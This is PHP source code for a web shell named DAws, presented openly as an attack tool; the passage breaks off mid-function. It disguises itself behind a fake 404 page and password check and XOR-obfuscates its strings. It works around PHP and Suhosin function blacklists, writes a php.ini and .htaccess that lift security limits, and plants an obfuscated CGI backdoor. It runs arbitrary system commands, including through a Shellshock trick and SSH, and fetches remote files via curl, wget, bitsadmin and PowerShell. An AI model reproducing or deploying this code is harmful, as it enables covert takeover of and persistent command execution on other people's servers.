<?php

$fake_page = "
<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
<hr>
<address>".$_SERVER["SERVER_SOFTWARE"]." Server at ".$_SERVER['SERVER_ADDR']." Port 80</address>
</body></html>";

@session_start(); //with error supression because using session_start() multiple times was causing an error on IIS

if (!isset($_SESSION["logged_in"]))
{
	if (isset($_POST["pass"]))
	{
		if(md5($_POST["pass"]) == "11b53263cc917f33062363cef21ae6c3") //DAws
		{
			$_SESSION["logged_in"] = True;
		}
		else
		{
			header("HTTP/1.1 404 Not Found");
			echo $fake_page;
			exit;
		}
	}
	else
	{
		header("HTTP/1.1 404 Not Found");
		echo $fake_page;
		exit();
	}
}

if (ob_get_level())
{
	ob_end_clean(); //no point of having output buffering on yet
}

if (!isset($_SESSION['key'])) //create our session key which will be used for encryption
{
	$characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$characters_length = strlen($characters);
	$random_string = "";
	for ($i = 0; $i < 10; $i++) //length = 10 (length doens't really matter that much though, check our xor functions to understand why)
	{
		$random_string .= $characters[rand(0, $characters_length - 1)];
	}
	$_SESSION['key'] = $random_string;
}

if (!isset($_SESSION['windows']))
{
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') //checking if we're running on a Window's machine
	{
		$_SESSION["windows"] = True;
	}
	else
	{
		$_SESSION["windows"] = False;
	}
}

//base64 recoded to bypass disablers
$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");

function bin_dec($string)
{
	$decimal = "";
	for($i = 0; $i<strlen($string); $i++)
	{
		$dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
		$decimal+=$dec;
	}

	return intval($decimal);
}

function dec_bin($dec)
{
	$binary = "";
	$current = intval($dec);

	if ($current == 0)
	{
		return "0";
	}

	while (1)
	{
		if ($current == 1)
		{
			$binary="1".$binary;
			break;
		}
		$binary = ($current%2).$binary;
		$current = intval($current/2);
	}

	return $binary;
}

function base64encoding($string)
{
	global $base64ids;

	$binary = "";
	for ($i = 0; $i<strlen($string); $i++)
	{
		$charASCII = ord($string{$i});
		$asciiBIN = dec_bin($charASCII);
		if (strlen($asciiBIN) != 8)
		{
			$asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;
		}
		$binary.= $asciiBIN;
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 6)
	{
		$part = substr($binary, $j, 6);
		array_push($array, $part);
	}

	if (strlen($array[count($array)-1]) != 6)
	{
		$array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
	}

	$base64 = "";
	foreach ($array as &$value)
	{
		$value = bin_dec($value);
		$value = $base64ids[$value];
		$base64.=$value;
	}

	if ((strlen($base64) % 4) != 0)
	{
		$base64.=str_repeat("=", 4-(strlen($base64) % 4));
	}

	return $base64;
}

function base64decoding($string)
{
	global $base64ids;

	$string = str_replace("=", "", $string);

	$binary = "";
	for ($i = 0; $i < strlen($string); $i++)
	{
		$charID = array_search($string{$i}, $base64ids);
		$idBIN = dec_bin($charID);
		if (strlen($idBIN) != 6)
		{
			$idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;
		}
		$binary.= $idBIN;
	}

	if (strlen($binary) %8 != 0)
	{
		$binary = substr($binary, 0, strlen($binary)-(strlen($binary) %8));
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 8)
	{
		$part = substr($binary, $j, 8);
		array_push($array, $part);
	}

	$text = "";
	foreach ($array as &$value)
	{
		$value = bin_dec($value);
		$value = chr($value);
		$text.=$value;
	}

	return $text;
}

function xor_this($string, $key=null) //our 'random key' based xor encryption
{
	if ($key == null)
	{
		$key = $_SESSION['key'];
	}

	$outText = '';

 	for($i=0; $i<strlen($string);)
 	{
		for($j=0; ($j<strlen($key) && $i<strlen($string)); $j++,$i++)
		{
			$outText .= $string{$i} ^ $key{$j};
		}
	}
	return base64encoding($outText);
} //so basically every string character gets xored once by one key character. That key character is chosen by order
//example: string=dotcppfile key=1234
//d will get xored by 1
//o will get xored by 2
//etc
//the first p will get xored by 1 as well because we start all over when all the characters of our key gets used.
//since we're using this function to bypass security systems only then it gets the job done at its best.

function unxor_this($string, $key=null)
{
	if ($key == null)
	{
		$key = $_SESSION['key'];
	}

	return base64decoding(xor_this(base64decoding($string), $key));
}

//recursive glob used later on to find DAws's directory (first method)
function recursive_glob($path, $pattern)
{
	$paths = glob($path."/*", GLOB_ONLYDIR);
	foreach ($paths as $path)
	{
		if ((is_readable($path)) && (is_writable($path)))
		{
				return $path;
		}
	}

	foreach ($paths as $path)
	{
		rglob($path);
	}
}

//recursive iterator used later on to find DAws's directory (second method)
function recursive_iterator($location)
{
	$iter = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator(realpath($location)),
		RecursiveIteratorIterator::SELF_FIRST,
		RecursiveIteratorIterator::CATCH_GET_CHILD
	);

	$paths = array(realpath($location));
	foreach ($iter as $path => $dir)
	{
		if (($dir->isDir()) && (is_readable($dir)) && (is_writable($dir)))
		{
			return realpath($path);
		}
	}
}

function get_php_ini($string) //read from php.ini
{
	$output = @ini_get($string);
	if ($output == "")
	{
		$output = @get_cfg_var($string);
	}

	return $output;
}

//check what's disabled by disable_functions and suhosin
$disabled_php = array();
$disabled_suhosin = array();

foreach (explode("," , get_php_ini(unxor_this("AAYHAhIcAzYKEAoMAAofHhU=", "dotcppfile"))) as $disabled) //disable_functions
{
	array_push($disabled_php, $disabled);
}
foreach (explode(",", get_php_ini(unxor_this("AAYHAhIcAzYPCQUcBwYD", "dotcppfile"))) as $disabled) //disabled_classes
{
	array_push($disabled_php, $disabled);
}
foreach (explode("," , get_php_ini(unxor_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA==", "dotcppfile"))) as $disabled) //suhosin.executor.func.blacklist
{
	array_push($disabled_suhosin, $disabled);
}

$disabled_php = array_filter($disabled_php);
$disabled_suhosin = array_filter($disabled_suhosin);

$disabled_php = array_map('trim', $disabled_php);
$disabled_suhosin = array_map('trim', $disabled_suhosin);

function disabled_php($function_name) //checks if a function is disabled by php
{
	foreach ($GLOBALS["disabled_php"] as $value)
	{
		if ($function_name == $value)
		{
			return True;
		}
	}

	return False;
}

function disabled_suhosin($function_name) //checks if a function is disabled by suhosin
{
	foreach ($GLOBALS["disabled_suhosin"] as $value)
	{
		if ($function_name == $value)
		{
			return True;
		}
	}

	return False;
}

function installed_php($function=null, $class=null) //checks if a function/class exists
{
	if ($function != null)
	{
		if (disabled_php("function_exists") == False)
		{
			if (disabled_suhosin("function_exists") == False)
			{
				if (function_exists($function))
				{
					return True;
				}
				else
				{
					return False;
				}
			}
			else
			{
				if (bypass_suhosin("function_exists", $function))
				{
					return True;
				}
				else
				{
					return False;
				}
			}
		}
		else
		{
			ob_start();
			$test = $function();
			$return_value = ob_get_contents();
			ob_end_clean();

			if ((strpos($return_value, "error") == False) && (strpos($return_value, "Warning") == False))
			{
				return True;
			}
			else
			{
				return False;
			}
		}
	}
	else
	{
		if (disabled_php("class_exists") == False)
		{
			if (disabled_suhosin("class_exists") == False)
			{
				if (class_exists($class))
				{
					return True;
				}
				else
				{
					return False;
				}
			}
			else
			{
				if (bypass_suhosin("class_exists", $class))
				{
					return True;
				}
				else
				{
					return False;
				}
			}
		}
		else
		{
			ob_start();
			$test = new $class();
			$return_value = ob_get_contents();
			ob_end_clean();

			if ((strpos($return_value, "error") == False) && (strpos($return_value, "Warning") == False))
			{
				return True;
			}
			else
			{
				return False;
			}
		}
	}
}

//finds DAws's directory; a writeable and readable directory
if (!isset($_SESSION["daws_directory"]))
{
	$daws_dir = getcwd();

	if ($_SESSION["windows"] == True)
	{
		$slash = "\\";
	}
	else
	{
		$slash = "/";
	}

	//finding the web dir which will be used here and when deploying the CGI Scripts
	if (isset($_SERVER['DOCUMENT_ROOT'])) //simple way
	{
		$_SESSION["web_dir"] = $_SERVER["DOCUMENT_ROOT"];

		$length = strlen($_SESSION["web_dir"]);
		if ($_SESSION["web_dir"][$length-1] == $slash) //because that last / or \ will ruin the cgi url value later on
		{
			$_SESSION["web_dir"] = substr($_SESSION["web_dir"], 0, $length-1);
		}
	}
	else //hard way
	{
		$array = explode($slash, getcwd());
		for ($i = 0; $i<(count(explode("/", $_SERVER["SCRIPT_NAME"]))-2); $i++)
		{
			array_pop($array);
		}

		$_SESSION["web_dir"] = implode($slash, $array);
	}

	//finding DAws's directory
	if ((is_writable($daws_dir)) && (is_readable($daws_dir)))
	{
		$_SESSION["daws_directory"] = $daws_dir; //no need to look further since we are in it
	}
	else //lets dance
	{
		$locations = array($_SESSION["web_dir"], realpath("/")); //we go for a random directory if a proper web directory wasn't found

		foreach ($locations as $location)
		{
			//uses the recursive glob function for old php versions
			if (disabled_php("glob") == False)
			{
				$_SESSION["daws_directory"] = recursive_glob(realpath($location));
			}
			else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (installed_php(null, "RecursiveIteratorIterator") == True)) //Iterator incoming!
			{
				$_SESSION["daws_directory"] = recursive_iterator($location);
			}

			if ((isset($_SESSION["daws_directory"])) && ($_SESSION["daws_directory"] != ""))
			{
				break;
			}
		}
	}
}

//drop our php.ini and .htaccess in DAws's directory
if (!isset($_SESSION["dropped"]))
{
	//what comes next will only matter if suphp is installed

	//we clear all disablers, allow eval and url opening
	$php_ini = "AAYHAhIcAzYKEAoMAAofHhVJUW8ABgcCEhwDNg8JBRwHBgNQW2MfEAwABwoeXgMRCQYRGxsRXhYTBw9LBgMVABscDxoYRVlPVkF6AxMBAxYNAVoGCBUFHBgKFkEQCgMRBAUJOgEZFQ9QTUYmCgNuDhgPHwc5HB4JOwkbExUeRlRMKgo=";
	//and here we link that php.ini to suphp as a config file
	//http://support.hostgator.com/articles/specialized-help/technical/how-to-get-your-php-ini-path-with-suphp
	$htaccess =
"<IfModule mod_suphp.c>
suPHP_ConfigPath ".$_SESSION["daws_directory"]."/php.ini
</IfModule>";

	write_to_file($_SESSION["daws_directory"]."/php.ini", unxor_this($php_ini, "dotcppfile"));
	write_to_file($_SESSION["daws_directory"]."/.htaccess", $htaccess);

	$_SESSION["dropped"] = True;

	//and now we move our shell to the directory that we just found and go there
	if (getcwd() != $_SESSION["daws_directory"])
	{
		if (strpos($_SESSION["web_dir"], $_SESSION["daws_directory"])) //move DAws to its directory if that directory is a web directory
		{
			copy($_SERVER["SCRIPT_FILENAME"], $_SESSION["daws_directory"]."/DAws.php");
			header("Location: http://".$_SERVER['SERVER_NAME'].str_replace($_SESSION["web_dir"], "", $_SESSION["daws_directory"]."/DAws.php"));
		}
	}
}

//finds the location of ruby/perl/python for Windows
if (!isset($_SESSION["python"]))
{
	$softwares = array("perl", "python", "ruby", "php");

	if ($_SESSION["windows"] == True) //will work on this one later
	{
	}
	else
	{
		foreach ($softwares as $software)
		{
			if (execute_command($software, True))
			{
				$_SESSION[$software] = $software;
			}
			else
			{
				$_SESSION[$software] = null;
			}
		}
	}
}

function write_to_file($location, $string)
{
	if (file_put_contents_extended($location, $string) == False)
	{
		if (($fp = fopen_extended($location, "w")) != False)
		{
			fwrite($fp, $string);
			fclose($fp);
		}
		else
		{
			execute_command("echo $string > $location");
		}
	}
}

function read_file($location)
{
	if (filesize($location) == 0) //empty files will cause file_get_contents to return false and fread to cause an error
	{
		return "";
	}

	if (($content = file_get_contents_extended($location)) != False)
	{
		return htmlspecialchars($content);
	}
	else if (($fp = fopen_extended($location, "r")) != False)
	{
		$content = htmlspecialchars(fread($fp, filesize($location)));
		fclose($fp);
		return htmlspecialchars($content);
	}
	else
	{
		if ($_SESSION["windows"] == True)
		{
			return htmlspecialchars(execute_command("type $location"));
		}
		else
		{
			return htmlspecialchars(execute_command("cat $location"));
		}
	}
}

function url_get_contents($url) //used to download the source of a webpage
{
	if ((installed_php("curl_version") == True) && (disabled_php("curl_init") == False))
	{
		if (disabled_suhosin("curl_init") == False)
		{
			$ch = curl_init(str_replace(" ","%20",$url));
		}
		else
		{
			$ch = bypass_suhosin("curl_init", str_replace(" ","%20",$url));
		}

		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$content = curl_exec($ch);
		curl_close($ch);

		return $content;
	}
	else if (($content = file_get_contents_extended($url, True)) != False)
	{
		return $content;
	}
	else if (($fp = fopen_extended($url, "r", True)) != False)
	{
		$content = htmlspecialchars(fread($fp, filesize($url)));
		fclose($fp);
		return $content;
	}
	else //system commands it is
	{
		if ($_SESSION["windows"] == True)
		{
			if (execute_command("bitsadmin", True)  == True) //bitsadmin is a nice choice here
			{
				execute_command("bitsadmin.exe /Transfer DAwsDownloadJob $link $location");
			}
			else if (strpos(execute_command("powershell.exe"), "Windows PowerShell")) //powershell comes next
			{
				execute_command("powershell.exe Invoke-WebRequest $link -OutFile $location");
			}
			else
			{
				return False; //sadly, nothing worked
			}
		}
		else //curl or wget for Linux
		{
			if (execute_command("curl", True) == True)
			{
				execute_command("curl $link -o $location");
			}
			else if (execute_command("wget", True) == True)
			{
				execute_command("wget $link -O $location");
			}
			else
			{
				return False;
			}
		}
	}
}

if (!isset($_SESSION["cgi"])) //setting up the cgi scripts
{
	$cgi_htaccess = "bi4QBzgRCA0AABZPFwQZXRUKHgwUG1RNAxhGRw4EEGU7EwQZCQcfRU8qDAYTMyEgZg==";
	$cgi_bash = "R05bARkeSQsNFgxlfgYTGAlJTiYLAQAGHgRLHRUVAVVUFxUIEkYEEQkDVmkVEw4GTEdGZX4AHx0LCAIBWQ8RABgfRktINDEqJjovIzI7JSsjTVQfUAMDDUxICk9TEF8uSEMPCgkCFQ0UTTpBNztCMl4/WV5MTUM5VUAERFAMRgsNFgFZQENdXQIMDwoAClQfUAMDDUxHF0BRUUBfRkYLR0QTVBAVFEZLH0pPQFRMF1IGYwkTBQNURxMfCwQNCwA=";
	$cgi_bat = "JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxeemwACkUBFx0QBFACDA8KAApaFwgERg0JCUQLEQAfFANHGB0QZVwGExgJSUk0MSomOi8jMjslKyNVCltVWUZXTAAKDBsHFRRIHRQRbgwREQQFEgAARUkLEQAfFANJTgAKDBsHFRRIHRQRRk9WBxUTCQ0JSxAXAEF6AwMdQxVEDBkHTUwCDA8KAApaFwgEbEwPCABK";
	$cgi_path = $_SESSION["daws_directory"]."/cgi";

	if (isset($_SERVER['HTTPS']))
	{
		$protocol = "https";
	}
	else
	{
		$protocol = "http";
	}

	if (!file_exists($cgi_path))
	{
		mkdir($cgi_path);
	}

	//writing everything
	write_to_file($cgi_path."/.htaccess", unxor_this($cgi_htaccess, "dotcppfile"));

	if ($_SESSION["windows"] == True)
	{
		write_to_file($cgi_path."/DAws.bat", unxor_this($cgi_bat, "dotcppfile"));
		chmod($cgi_path."/DAws.bat", 0755);
		$_SESSION["cgi_url"] = $protocol."://".$_SERVER['SERVER_NAME'].str_replace("\\", "/", str_replace(realpath($_SESSION["web_dir"]), "", $cgi_path))."/DAws.bat";
	}
	else
	{
		write_to_file($cgi_path."/DAws.sh", unxor_this($cgi_bash, "dotcppfile"));
		chmod($cgi_path."/DAws.sh", 0755);
		$_SESSION["cgi_url"] = $protocol."://".$_SERVER['SERVER_NAME'].str_replace($_SESSION["web_dir"], "", $cgi_path)."/DAws.sh";
	}

	//testing it
	$test = url_get_contents($_SESSION["cgi_url"]."?command=".base64encoding("echo dotcppfile"));
	if(($test != "") && (strpos($test, "Internal Server Error") === False) && (strpos($test, "QUERY_STRING") === False))
	{
		$_SESSION["cgi"] = True;
	}
	else
	{
		$_SESSION["cgi"] = False;
	}
}

function execute_ssh($command) //ssh
{
	include_php($_SESSION["daws_directory"]."/SSH2.php"); //this should have been uploaded by the user himself

	$ssh = new Net_SSH2('127.0.0.1', $_SESSION["ssh_port"]);

	if ($ssh->login($_SESSION["ssh_user"], unserialize($_SESSION["ssh_rsa"])))
	{
		return $ssh->exec($command);
	}
}

function shsh($command) //shellshock
{
	$filename = $_SESSION["daws_directory"].rand(1,1000).".data";
	putenv("PHP_LOL=() { x; }; $command > $filename 2>&1");
	mail("a@127.0.0.1", "", "", "", "-bv");
	if (file_exists($filename))
	{
		if (($content = file_get_contents_extended($filename)) == False)
		{
			$fp = fopen_extended($filename, "r");
			$content = htmlspecialchars(fread($fp, filesize($filename)));
			fclose($fp);
		}
		unlink($filename);
	}
	else
	{
		$content = "";
	}

	return $content;
} //this was written by Starfall and I know that this will simply fail if sendmail was uninstalled
// I am working on something that would basically find cgi scripts and try to invoke shellshock based on HTTP Headers.
//I started working on it months ago and then I stopped but I'll finish it soon, I hope.
//The point is that this shellshock is a big deal even though it's getting old but adding extra methods that will
//somehow guarantee its success on a vulnerable system makes DAws stronger.
//If you have any other methods in mind then hit me up, thanks in advance.

if (!isset($_SESSION["shsh"])) //testing shellshock
{
	if ($_SESSION["windows"] == False) //more checks aren't necessary thanks to the upcoming test
	{
		if (shsh("echo Dyme and Starfall") == "Dyme and Starfall")
		{
			$_SESSION["shsh"] = True;
		}
		else
		{
			$_SESSION["shsh"] = False;
		}
	}
	else
	{
		$_SESSION["shsh"] = False;
	}
}

function bypass_suhosin($function, $arg1=null, $arg2=null, $arg3=null, $output_needed = True) //I found no other way to deal with arguments... poor me.
{
	if ($arg3 != null)
	{
		if (disabled_php("call_user_func") == False)
		{
			$return_value = call_user_func($function, $arg1, $arg2, $arg3);
		}
		else if (disabled_php("call_user_func_array") == False)
		{
			$return_value = call_user_func_array($function, array($arg1, $arg2, $arg3));
		}
		else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False))
		{
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1, $arg2, $arg3);
			if (is_string($handle))
			{
				$return_value = $handle;
			}
			else
			{
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		}
		else if ($output_needed == False)
		{
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False))
			{
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1, $arg2, $arg3));
			}
			else if (disabled_php("register_tick_function") == False)
			{
				declare(ticks=1);
				register_tick_function($function, $arg1, $arg2, $arg3);
				unregister_tick_function($function);
			}
			else if (disabled_php("array_map") == False)
			{
				array_map($function, array($arg1, $arg2, $arg3));
			}
			else if (disabled_php("array_walk") == False)
			{
				$x = array($arg1, $arg2, $arg3);
				array_walk($x, $function);
			}
			else if (disabled_php("array_filter") == False)
			{
				array_filter(array($arg1, $arg2, $arg3), $function);
			}
			else if (disabled_php("register_shutdown_function"))
			{
				register_shutdown_function($function, $arg1, $arg2, $arg3);
			}
		}
	}
	else if ($arg2 != null)
	{
		if (disabled_php("call_user_func") == False)
		{
			$return_value = call_user_func($function, $arg1, $arg2);
		}
		else if (disabled_php("call_user_func_array") == False)
		{
			$return_value = call_user_func_array($function, array($arg1, $arg2));
		}
		else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False))
		{
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1, $arg2);
			if (is_string($handle))
			{
				$return_value = $handle;
			}
			else
			{
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		}
		else if ($output_needed == False)
		{
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False))
			{
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1, $arg2));
			}
			else if (disabled_php("register_tick_function") == False)
			{
				declare(ticks=1);
				register_tick_function($function, $arg1, $arg2);
				unregister_tick_function($function);
			}
			else if (disabled_php("array_map") == False)
			{
				array_map($function, array($arg1, $arg2));
			}
			else if (disabled_php("array_walk") == False)
			{
				$x = array($arg1, $arg2);
				array_walk($x, $function);
			}
			else if (disabled_php("array_filter") == False)
			{
				array_filter(array($arg1, $arg2), $function);
			}
			else if (disabled_php("register_shutdown_function"))
			{
				register_shutdown_function($function, $arg1, $arg2);
			}
		}
	}
	else if ($arg1 != null)
	{
		if (disabled_php("call_user_func") == False)
		{
			$return_value = call_user_func($function, $arg1);
		}
		else if (disabled_php("call_user_func_array") == False)
		{
			$return_value = call_user_func_array($function, array($arg1));
		}
		else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False))
		{
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1);
			if (is_string($handle))
			{
				$return_value = $handle;
			}
			else
			{
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		}
		else if ($output_needed == False)
		{
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False))
			{
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1));
			}
			else if (disabled_php("register_tick_function") == False)
			{
				declare(ticks=1);
				register_tick_function($function, $arg1);
				unregister_tick_function($function);
			}
			else if (disabled_php("array_map") == False)
			{
				array_map($function, array($arg1));
			}
			else if (disabled_php("array_walk") == False)
			{
				$x = array($arg1, $arg2, $arg3);
				array_walk($x, $function);
			}
			else if (disabled_php("array_filter") == False)
			{
				array_filter(array($arg1), $function);
			}
			else if (disabled_php("register_shutdown_function"))
			{
				register_shutdown_function($function, $arg1);
			}
		}
	}
	else
	{
		if (disabled_php("call_user_func") == False)
		{
			$return_value = call_user_func($function);
		}
		else if (disabled_php("call_user_func_array") == False)
		{
			$return_value = call_user_func_array($function, array());
		}
		else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False))
		{
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke();
			if (is_string($handle))
			{
				$return_value = $handle;
			}
			else
			{
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		}
		else if ($output_needed == False)
		{
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False))
			{
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array());
			}
			else if (disabled_php("register_tick_function") == False)
			{
				declare(ticks=1);
				register_tick_function($function);
				unregister_tick_function($function);
			}
			else if (disabled_php("array_map") == False)
			{
				array_map($function, array());
			}
			else if (disabled_php("array_walk") == False)
			{
				$x = array();
				array_walk($x, $function);
			}
			else if (disabled_php("array_filter") == False)
			{
				array_filter(array(), $function);
			}
			else if (disabled_php("register_shutdown_function"))
			{
				register_shutdown_function($function);
			}
		}
	}

	return $return_value;
}

function execute_command($command, $software_check = False) //this is also used to check for installed softwares
{
	if ($software_check == True)
	{
		if (($_SESSION["windows"]) == True)
		{
			$command = "where $command";
		}
		else
		{
			$command = "which $command";
		}
	}

	if (disabled_php("system") == False) //not disabled by disable_functions
	{
		ob_start();
		if (disabled_suhosin("system") == False) //not disabled by Suhosin
		{
			system($command);
		}
		else //disabled by Suhosin
		{
			bypass_suhosin("system", $command, null, null, False);
		}
		$return_value = ob_get_contents();
		ob_end_clean();
	}
	else if (disabled_php("passthru") == False)
	{
		ob_start();
		if (disabled_suhosin("passthru") == False)
		{
			passthru($command);
		}
		else
		{
			bypass_suhosin("passthru", $command, null, null, False);
		}
		$return_value = ob_get_contents();
		ob_end_clean();
	}
	else if (disabled_php("shell_exec") == False)
	{
		if (disabled_suhosin("shell_exec") == False)
		{
			$return_value = shell_exec($command);
		}
		else
		{
			$return_value = bypass_suhosin("shell_exec", $command);
		}
	}
	else if (disabled_php("exec") == False)
	{
		if (disabled_suhosin("exec") == False)
		{
			$return_value = exec($command);
		}
		else
		{
			$return_value = bypass_suhosin("exec", $command);
		}
	}
	else if (disabled_php("popen") == False)
	{
		if (disabled_suhosin("popen") == False)
		{
			$handle = popen($command, "r");
		}
		else
		{
			$handle = bypass_suhosin("popen", $command, "r");
		}
		$return_value = fread($handle, 4096);
		pclose($handle);
	}
	else if (disabled_php("proc_open") == False)
	{
		if (disabled_suhosin("proc_open") == False)
		{
			$process = proc_open(
				$command,
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
		}
		else //this gave me a headache so I will check it out later
		{
			/*
			echo "proc_open-suhosin";
			$process = bypass_suhosin(
				"proc_open",
				$command,
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes);*/
		}

		$stdout = stream_get_contents($pipes[1]);
		$stderr = stream_get_contents($pipes[2]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);

		if ($stderr == "")
		{
			$return_value = $stdout;
		}
		else
		{
			$return_value = $stderr;
		}
	}
	else if ($_SESSION["cgi"] == True)
	{
		$return_value = url_get_contents($_SESSION["cgi_url"]."?command=".base64encoding($command));
	}
	else if ($_SESSION["shsh"] == True)
	{
		$return_value = shsh($command);
	}
	else if ($_SESSION["ssh"] == True)
	{
		$return_value = execute_ssh($command);
	}

	if ($software_check == True)
	{
		if (($return_value != "") && (!strpos($return_value, "Could not find files")))
		{
			return True;
		}
		else
		{
			return False;
		}
	}
	else
	{
		return $return_value;
	}
}

function execute_script($code, $location, $extension, $output_needed = False)
{
	$filename = $_SESSION["daws_directory"]."/".rand(1, 1000).".".$extension;
	write_to_file($filename, $code);

	$command = $location." ".$filename;

	//run the script in background and redirect its output to null
	if ($output_needed == False) //we have to make sure that the user doesn't care about the output since we're redirecting it to null
	{
		if ($_SESSION["windows"] == True)
		{
			$command = "START /B $command > null";
		}
		else
		{
			if (execute_command("nohup", True)) //use nohup if installed
			{
				$command = "nohup $command > /dev/null 2>&1 &";
			}
		}
	}

	return execute_command($command);
}

function file_get_contents_extended($filename, $is_url = False) //same thing was done for multiple other functions, the point is to bypass Suhosin using less code Lol
{
	if (disabled_php("file_get_contents") == False)
	{
		if ((($is_url == True) && (ini_get("allow_url_fopen"))) || ($is_url == False))
		{
			if (disabled_suhosin("file_get_contents") == False)
			{
				return file_get_contents($filename);
			}
			else
			{
				return bypass_suhosin("file_get_contents", $filename);
			}
		}
	}
	else
	{
		return False;
	}
}

function fopen_extended($filename, $type, $is_url = False)
{
	if (disabled_php("fopen") == False)
	{
		if ((($is_url == True) && (get_php_ini("allow_url_fopen"))) || ($is_url == False))
		{
			if (disabled_suhosin("fopen") == False)
			{
				return fopen($filename, $type);
			}
			else
			{
				return bypass_suhosin("fopen", $filename, $type);
			}
		}
	}
	else
	{
		return False;
	}
}

function file_put_contents_extended($file_name, $input)
{
	if (disabled_php("file_put_contents") == False)
	{
		if (disabled_suhosin("file_put_contents") == False)
		{
			file_put_contents($file_name, $input);
		}
		else
		{
			bypass_suhosin("file_put_contents", $file_name, $input, null, False);
		}
	}
	else
	{
		return False;
	}
}

function include_php($filename)
{
	if (disabled_php("include") == False)
	{
		if (disabled_suhosin("include") == False)
		{
			include($filename);
		}
		else
		{
			bypass_suhosin("include", $filename, null, null, False);
		}
		unlink($filename);
	}
	else if (disabled_php("include_once") == False)
	{
		if (disabled_suhosin("include_once") == False)
		{
			include_once($filename);
		}
		else
		{
			bypass_suhosin("include_once", $filename, null, null, False);
		}
		unlink($filename);
	}
	else if (disabled_php("require") == False)
	{
		if (disabled_suhosin("require") == False)
		{
			require($filename);
		}
		else
		{
			bypass_suhosin("require", $filename, null, null, False);
		}
		unlink($filename);
	}
	else if (disabled_php("require_once") == False)
	{
		if (disabled_suhosin("require_once") == False)
		{
			require_once($filename);
		}
		else
		{
			bypass_suhosin("require_once", $filename, null, null, False);
		}
		unlink($filename);
	}
}

function execute_php($code, $output_needed) //eval and its substitutes
{
	if (!get_php_ini("suhosin.executor.disable_eval")) //we use eval since it's not blocked by suhosin
	{
		eval($code);
	}
	else if ((disabled_php("include") == False) || (disabled_php("include_once") == False) || (disabled_php("require") == False) || (disabled_php("require_once") == False)) //lets the bodies hit the floor!
	{
		$code = "<?php\n".$code."\n?><?php\n".$code."\n?>